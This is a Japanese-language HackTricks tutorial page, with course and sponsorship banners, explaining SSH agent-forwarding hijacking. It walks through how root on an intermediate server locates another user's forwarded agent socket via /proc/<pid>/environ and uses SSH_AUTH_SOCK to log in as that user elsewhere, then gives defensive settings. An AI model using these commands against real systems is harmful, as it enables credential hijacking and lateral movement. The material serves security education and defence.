<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ハッキングテクニックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに。

</details>


# Summary

`/etc/ssh_config` または `$HOME/.ssh/config` 内でこのような設定を発見した場合、何ができるでしょうか：
```
ForwardAgent yes
```
もしマシン内でroot権限を持っている場合、おそらく/tmpディレクトリ内で見つけることができるsshエージェントを使用して、Bobをなりすますことができます:

Bobをなりすましてください:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## なぜこれが機能するのか？

変数`SSH_AUTH_SOCK`を設定すると、Bobのssh接続で使用されたBobのキーにアクセスします。その後、彼の秘密鍵がまだそこにある場合（通常はそうである）、それを使用して任意のホストにアクセスできます。

秘密鍵はエージェントのメモリに平文で保存されているため、Bobであるが秘密鍵のパスワードを知らない場合でも、エージェントにアクセスして使用することができると思われます。

もう1つのオプションとして、エージェントの所有者であるユーザーとrootは、エージェントのメモリにアクセスして秘密鍵を抽出することができるかもしれません。

# 長い説明と悪用

**この投稿を、削除された投稿のウェイバックマシンとして提供します:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **ForwardAgentが信頼できない場合**

パスワードなしのSSHは、Unix系オペレーティングシステムとの生活をはるかに簡単にします。ネットワークがチェーンされたsshセッションを必要とする場合（たとえば、制限されたネットワークにアクセスする場合など）、エージェントの転送は非常に役立ちます。エージェントの転送を使用すると、ラップトップから開発サーバーに接続し、そこからさらに別のサーバーからsvnチェックアウトを実行することが可能です。すべてのパスワードなしで、同時にプライベートキーをローカルワークステーションに安全に保管します。

ただし、これは危険です。迅速なウェブ検索では、中間ホストが信頼できる場合にのみ安全であると示す記事がいくつか見つかります。しかし、なぜ危険なのかについての説明はほとんど見つかりません。

それがこの記事の目的です。しかし、まず、いくつかの背景情報を紹介します。

## **パスワードなし認証の仕組み**

通常モードで認証する際、SSHはあなたが自分自身であることを証明するためにパスワードを使用します。サーバーはこのパスワードのハッシュをファイルに持っているものと比較し、ハッシュが一致することを確認してから入室を許可します。

攻撃者がサーバーに送信される際にパスワードを保護するために使用される暗号化を解読できれば、それを盗むことができ、望むときにあなたとしてログインできます。攻撃者が何十万回もの試行を行うことが許可されると、最終的にはあなたのパスワードを推測できます。

はるかに安全な認証方法は、[公開鍵認証](http://www.ibm.com/developerworks/library/l-keyc/index.html)です。これはパスワードなしでログインする方法です。公開鍵認証には、公開鍵と秘密鍵の一致するペアが必要です。公開鍵は、秘密鍵でのみ復号できるメッセージを暗号化します。リモートコンピューターは、あなたに秘密のメッセージを暗号化して送信するためにあなたの公開鍵のコピーを使用します。あなたは、秘密鍵を使用してメッセージを復号し、メッセージをリモートコンピューターに送信することで、あなたがあなたであることを証明します。あなたの秘密鍵は常にローカルコンピューターに安全に保管されており、攻撃から守られています。

秘密鍵は貴重であり、保護する必要があるため、デフォルトでは暗号化形式で保存されています。残念ながら、これは使用する前に暗号化パスフレーズを入力する必要があることを意味します。多くの記事は、この不便を避けるためにパスフレーズのない（暗号化されていない）秘密鍵を使用することを提案しています。これは良い考えではありません。なぜなら、あなたのワークステーションにアクセスできる人（物理的アクセス、盗難、またはハッキングを通じて）は、あなたの公開鍵で構成されたコンピューターにも自由にアクセスできるからです。

OpenSSHには、ローカルワークステーションで実行されるデーモンである[ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)が含まれています。これは、あなたの秘密鍵の復号済みコピーをメモリに読み込みます。したがって、一度だけ暗号化パスフレーズを入力する必要があります。その後、sshクライアントが使用できるローカル[ソケット](http://en.wikipedia.org/wiki/Unix\_domain\_socket)を提供します。リモートサーバーがあなたに秘密のメッセージを暗号化して送信するために、sshクライアントがそれに復号化するように要求することができます。あなたの秘密鍵は、パスワードを入力せずにsshをタイプすることができるまま、ssh-agentプロセスのメモリに安全に保管されたままです。

## **ForwardAgentの動作**

多くのタスクでは、「チェーン」されたsshセッションが必要です。以前の例を考えてみましょう。ワークステーションから開発サーバーにssh接続します。そこで、"svn+ssh"プロトコルを使用してsvn更新を実行する必要があります。超機密の秘密鍵の平文コピーを共有サーバーに残しておくのは愚かなことなので、パスワード認証に引っかかってしまいます。ただし、ワークステーションのssh構成で「ForwardAgent」を有効にした場合、sshは組み込みのトンネリング機能を使用して、開発サーバー上にもう1つのソケットを作成し、それをローカルワークステーションで実行されているssh-agentソケットに戻すトンネリングします。これにより、開発サーバー上のsshクライアントは、自分の秘密鍵にアクセスせずに、ローカルワークステーションで実行されているssh-agentに直接「この秘密メッセージを復号化してください」とリクエストを送信でき、svnサーバーに自分自身を認証できます。

## **なぜこれが危険なのか**

単純に言えば、中間サーバーのroot権限を持つ人は、あなたのssh-agentを自由に使用して他のサーバーに認証できます。簡単なデモンストレーションで、これがどれほど簡単に行われるかを示します。被告を保護するためにホスト名とユーザー名が変更されています。

私のラップトップはssh-agentを実行しており、そのソケットを介してsshクライアントプログラムと通信しています。このソケットへのパスは、SSH_AUTH_SOCK環境変数に保存されています。
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
[ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) プログラムを使用すると、エージェント内のキーを表示および操作できます。
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
私のラップトップの\~/.ssh/configには「ForwardAgent yes」と書かれています。したがって、sshはローカルソケットとリモートサーバーのローカルソケットを接続するトンネルを作成します：
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
たとえ私のキーが「seattle」にインストールされていなくても、sshクライアントプログラムはまだ私のローカルマシンで実行されているエージェントにアクセスできます：
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
だから…誰をいじめることができるのか？
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Bobが好きではありません。彼のエージェント接続を見つけるために、彼のsshセッションの子プロセスを見つける必要があります：
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)───bash(16817)

sshd(25296)───bash(25297)───vim(14308)
```
複数の方法がありますが、rootは実行中のプロセスの環境を表示できます。Linuxでは、そのデータは/proc/<pid>/environにあります。NULLで終端された文字列で保存されているため、NULLを改行に変換するためにtrを使用します。
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
私は今、Bobのssh-agentを乗っ取るために必要なすべてを知っています。
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
もし特定のターゲットを持っている場合は、直接接続できるはずです。そうでない場合は、プロセスリストを監視したり、Bobの履歴ファイルをgrepしたりすると、たくさんの機会ターゲットが見つかるはずです。この場合、私はBobがサーバーに保存しているさまざまな超機密ファイルがあることを知っています。
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **自己保護！**

ssh-agentがキーを無期限に保存しないようにしましょう。OS Xでは、Keychainを設定して、非アクティブ時や画面ロック時にロックされるようにします。他のUnix系プラットフォームでは、ssh-agentに -t オプションを渡すことで、キーが seconds 後に削除されるようにします。

信頼できないホストに接続する際は、エージェント転送を有効にしないでください。幸いにも、\~/.ssh/config 構文を使用すれば、これはかなり簡単です。
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **おすすめの読み物**

* [OpenSSHキー管理](http://www.ibm.com/developerworks/library/l-keyc/index.html) – Daniel Robbins
* [SSH Agent Forwardingの図解ガイド](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) – Steve Friedl
* [ssh-agentマニュアル](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [ssh-addマニュアル](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)をフォローする**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください**

</details>
